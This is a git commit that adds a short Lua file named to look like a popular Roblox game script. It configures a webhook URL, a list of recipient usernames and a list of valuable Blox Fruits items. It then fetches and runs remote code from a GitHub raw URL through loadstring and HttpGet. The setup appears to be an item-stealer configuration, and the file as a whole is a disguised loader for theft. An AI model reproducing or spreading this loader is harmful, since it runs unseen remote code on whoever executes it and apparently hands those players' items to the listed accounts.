c7139b3d6bf4e303b00b1b9952ecc44b9e5011da
redz-main <donselling01@gmail.com>
2025-04-13 22:28:31 +0800

    Create realredz.lua

---
+++ realredz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=MTJteFdTQW81WEljMDEzd21oZ0RmdzpHaDVTZjgwbC0xNEJsN2hJZTdXUFljWEJkaEU2UTQ5cU5DMXE3eU5SUFR6SEtHbXRZX292TmMzUFhzMFdrbXlPWVQxOXpHUlR3c0xMWHRuaWZYMjVaTHBGMkVabVM2V1NXeWZRZk1QeFk3cHMxWDBxMUtJYXRKWkNpUGFUcGJXc2hIc1haaktOcjBqc3NSRFdhWmM4dFk5bVhWRE90dktrdHpBWEdkbHgtekk" -- << Your Webhook
+Usernames = {"Zy10022000", "uaraazabna", "Zy10022001"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
